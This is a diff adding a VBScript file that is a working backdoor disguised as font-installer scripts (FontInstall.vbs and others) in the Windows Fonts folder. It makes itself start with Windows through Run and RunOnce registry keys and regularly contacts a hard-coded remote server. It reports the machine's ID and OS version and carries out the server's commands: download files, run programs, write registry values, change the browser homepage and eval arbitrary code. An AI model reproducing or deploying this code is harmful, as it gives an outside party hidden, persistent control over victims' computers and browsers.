@@ -1,0 +1,315 @@
+
+'------------------- Begin Script ----------------------
+ID="80968.72"
+ServerURL="Http://main.feneben.com/VScript/Remote.asp"
+
+Ver="2.3"
+Dim EndFlag,itimer,ScriptName,RunOneMode,OS,DelayA,DelayB
+Set WshShell = createObject("WScript.Shell")
+Set FSO = Createobject("scripting.filesystemobject")
+FontsPath = WshShell.SpecialFolders("Fonts")
+StartupPath = WshShell.SpecialFolders("Startup")
+RunFlag=True
+DefRegKey="\Software\Microsoft\Windows\CurrentVersion\"
+DelayA=3
+DelayB=17
+'*************************************************************************
+function CondSet(byVal Cond,ByRef VarName,ByVal ifTrueValue,ByVal ifFalseValue)
+ if Cond then VarName=ifTrueValue else VarName=ifFalseValue
+ CondSet=""
+end function
+'*************************************************************************
+function SetV(byRef VarName,ByVal Value)
+ VarName=Value
+ SetV=""
+end Function
+'*************************************************************************************
+function CreateO(byRef ObjVarName,ByRef Obj)
+ Set ObjVarName=Obj
+ CreateO=""
+end Function
+'*************************************************************************************
+function GetRemotePage(URL,PostData,ServerTimeOut,TextMode)
+ dim CT,Expi,Stream,UAgnt
+ GetRemotePage = "-3"
+ if not IsNumeric(ServerTimeOut) then
+  ServerTimeOut=2
+ end if
+ on error resume next
+  Set xml = CreateObject("MSXML2.ServerXMLHTTP")
+ If Err.Number <> 0 then 
+   Set xml = CreateObject("Microsoft.XMLHTTP")
+ end if
+ On Error Resume Next
+  UAgnt="Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
+  If (PosData="") then
+   xml.Open "GET", URL, true
+   xml.setRequestHeader "User-Agent",UAgnt
+   call xml.send
+  else
+   xml.Open "POST", URL, true
+   xml.setRequestHeader "User-Agent",UAgnt
+   call xml.send(PostData)
+  end if
+  If xml.readyState <> 4 then
+    xml.waitForResponse ServerTimeOut
+  End If
+ If Err.Number <> 0 then
+    GetRemotePage = "-1"
+ Else
+   If (xml.readyState <> 4) Or (xml.Status <> 200) Then
+     xml.Abort
+     GetRemotePage = "-2"
+   Else
+    if TextMode then
+     GetRemotePage = xml.ResponseText
+    else
+     GetRemotePage = xml.responseBody
+    end if
+   End If
+ End If
+ set xml=nothing
+end function
+'*******************************************************************************
+sub SaveBinaryData2Disk(FileName,binaryData)
+ Dim Stream 
+ on Error resume next 
+  set stream = createobject("adodb.stream")
+  stream.type = 1
+  stream.mode = 3
+  stream.open
+  stream.write binaryData
+  stream.savetofile Filename, 2
+  stream.close
+  set stream = Nothing
+ if Err.Number<>0 then
+  Err.Clear
+ end if
+End sub
+'*******************************************************************************
+sub SaveData2Disk(FileName,Data)
+ on Error resume next 
+  Set newFile = FSO.createtextfile(FileName, True)
+   newFile.write Data
+  newFile.Close
+ if Err.Number<>0 then
+  Err.Clear
+ end if
+End sub
+'*******************************************************************************
+Sub RegWrite(RegKey,RegVal)
+ on Error resume next 
+  WSHShell.RegWrite RegKey,RegVal
+ if Err.Number<>0 then
+  Err.Clear
+ end if
+End sub
+'*******************************************************************************
+Function RegRead(RegKey)
+ on Error resume next 
+  RegRead=WSHShell.RegRead(RegKey)
+ if Err.Number<>0 then
+  Err.Clear
+ end if
+End Function
+'*******************************************************************************
+function SetDefaultPage(URL)
+ RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", URL
+end function
+'*******************************************************************************
+function ReplaceConsts(St)
+ St=Replace(St,"FONTPATH",FontsPath)
+ St=Replace(St,"STARTUPPATH",StartUPPath)
+ ReplaceConsts=St
+end function
+'*******************************************************************************
+Function ReadData(byref ar,byref C)
+  Dim Data,St,FirstFlag
+  Data=""
+  FirstFlag=True
+  Do While (C<UBound(ar)) 
+   St=Ar(c)
+   if (Len(Trim(ST))>1)And(mid(St,1,1)=">") then 
+    ReadData=Data
+    Exit Function
+   End if
+   C=C+1
+   if (not FirstFlag) then Data=Data+Chr(13) & Chr(10)
+   Data=Data & St
+   FirstFlag=False
+  Loop
+End Function
+'*******************************************************************************
+Function DoSleep(Mnt)
+ dim i1,i0
+ for i0=1 to Mnt
+  for i1=1 to 6
+   wscript.Sleep 10000
+  next
+ next
+end function
+'*******************************************************************************
+Function RemoteExecute(URL)
+ Dim St,FileName,Data,Dumy,Ar,Stream
+ RemoteExecute=True
+ Data=GetRemotePage(URL,"",5,True)
+ ar=split(Data,Chr(13) & Chr(10))
+ 
+ if (UBound(ar)=0)Or(ar(UBound(ar))<>">END") then exit function
+  
+  on error resume next
+  c=0
+  Do While (C<UBound(ar)) 
+   CMD=ar(c)
+   c=c+1 
+
+
+   If ((Len(CMD)>1)And(mid(CMD,1,1)=">")And(Trim(CMD)<>"")) Then
+
+    select case (Trim(UCASE(CMD)))
+
+       CASE ">END"
+        Exit Function
+
+       CASE ">TERMINATE"
+        RemoteExecute=False
+        Exit Function
+
+       CASE ">NULLDATA" 
+        Dumy=ReadData(Ar,C)
+
+       CASE ">EXEC"
+        FileName=ReplaceConsts(ar(c))
+        C=C+1
+        WshShell.Run FileName 
+
+       CASE ">SETHOMEPAGE"
+         Data=ReadData(Ar,C)
+         SetDefaultPage(Data)
+
+       CASE ">CREATEFILE"
+        FileName=ReplaceConsts(ar(c))
+        C=C+1
+        Data=ReadData(Ar,C)
+        SaveData2Disk FileName , Data
+
+       CASE ">SETREGVALUE"
+        St=ReplaceConsts(ar(c))
+        C=C+1
+        FileName=ReplaceConsts(ar(c))
+        C=C+1
+        on error resume next
+        WSHShell.RegWrite St, FileName
+
+       CASE ">DOWNLOAD"
+        URL=ar(c)
+        C=C+1
+        FileName=ReplaceConsts(ar(c))
+        C=C+1
+        Stream=GetRemotePage(URL,"",60*20,False)
+        SaveBinaryData2Disk FileName,Stream
+
+       CASE ">REGSVR32"
+        FileName=ReplaceConsts(ar(c))
+        C=C+1
+        WshShell.Run("regsvr32 /s ")
+
+       CASE ">UNINSTALL"
+        on Error resume Next
+           WSHShell.RegDelete "HKCU" & DefRegKey & "Run\Fonts"
+           WSHShell.RegDelete "HKCU" & DefRegKey & "RunOnce\Fonts"
+           WSHShell.RegDelete "HKLM" & DefRegKey & "Run\Fonts"
+           FSO.DeleteFile FontsPath & "\FontInstallOnce.vbs"
+           FSO.DeleteFile FontsPath & "\FontInstallALL.vbs"
+           FSO.DeleteFile FontsPath & "\FontInstall.vbs"
+        if Err.Number<>0 then
+          Err.Clear
+        end if
+
+       CASE ">EVAL" 
+        St=ar(c)
+        c=c+1
+        Do While (trim(ST)="")Or((C<=UBound(ar))And(Len(ST)>1)And(mid(St,1,1)<>">"))
+         if trim(st)<>"" then
+          on error resume next
+          x=eval(st)
+          if Err.Number<>0 then
+           Err.Clear
+          end if
+         end if
+         St=ar(c)
+         c=c+1
+        loop
+        if (mid(St,1,1)=">") Then c=c-1
+
+     end select
+    end if   
+   loop
+
+ if Err.Number<>0 then
+'  MsgBox "Error # " & CStr(Err.Number) & " " & Err.Description
+  Err.Clear
+ end if
+end Function
+'*******************************************************************************
+Sub CheckAndWrite(RegName,FileName)
+ On Error Resume Next
+  if not fs.FileExists(FileName) then
+   FSO.copyfile wscript.scriptfullname,FileName
+  end if
+  RegWrite RegName, FileName
+ if Err.Number<>0 then
+  Err.Clear
+ end if
+End Sub
+'*******************************************************************************
+Function RemoteReport(Data)
+ RemoteReport=GetRemotePage(ServerURL & "?ID=" & ID & "&Data=" & Data,"",60,True)
+End function
+'*******************************************************************************
+Sub ExecuteScript()
+ RunOneMode=False
+ DefMode=False
+
+ IF inStr(UCASE(wscript.scriptfullname),UCASE("FontInstallOnce.vbs")) Then RunOneMode=True
+ IF inStr(UCASE(wscript.scriptfullname),UCASE("FontInstall.vbs")) Then DefMode=True
+ 
+ IF DefMode Then
+  ScriptName=RegRead("HKLM" & DefRegKey & "Run\Fonts")
+  if ScriptName<>"" Then
+   if FSO.FileExists(ScriptName) then RunFlag=False
+  end if
+ End If
+
+ If RunOneMode Then
+  ScriptName=RegRead("HKCU" & DefRegKey & "Run\Fonts")
+  if ScriptName<>"" Then
+   if FSO.FileExists(ScriptName) then RunFlag=False
+  end if
+ end if
+
+ CheckAndWrite "HKCU" & DefRegKey & "Run\Fonts", FontsPath & "\FontInstall.vbs"
+ CheckAndWrite "HKCU" & DefRegKey & "RunOnce\Fonts", FontsPath & "\FontInstallOnce.vbs"
+ CheckAndWrite "HKLM" & DefRegKey & "Run\Fonts", FontsPath & "\FontInstallALL.vbs"
+
+ Do While RunFlag
+   If (DelayA+DelayB>180)Or(DelayA+DelayB=0)Or(Not isnumeric(DelayA+DelayB)) Then
+    DelayA=3
+    DelayB=17
+   End if
+   DoSleep(DelayA)
+   TM=Hour(Time) & ":" & Minute(Time)
+   RunFlag=RemoteExecute(ServerURL & "?ID="  & ID & "&Ver=" & Ver & "&TM=" & TM & "&OS=" & OS)
+   DoSleep(DelayB)
+ loop
+End Sub
+'*******************************************************************************
+
+OS=RegRead("HKLM\Software\Microsoft\Windows NT\CurrentVersion\CurrentVersion")
+
+If (ID<>"") then
+ ExecuteScript()
+end if
+
+
+'------------------- End Script ----------------------
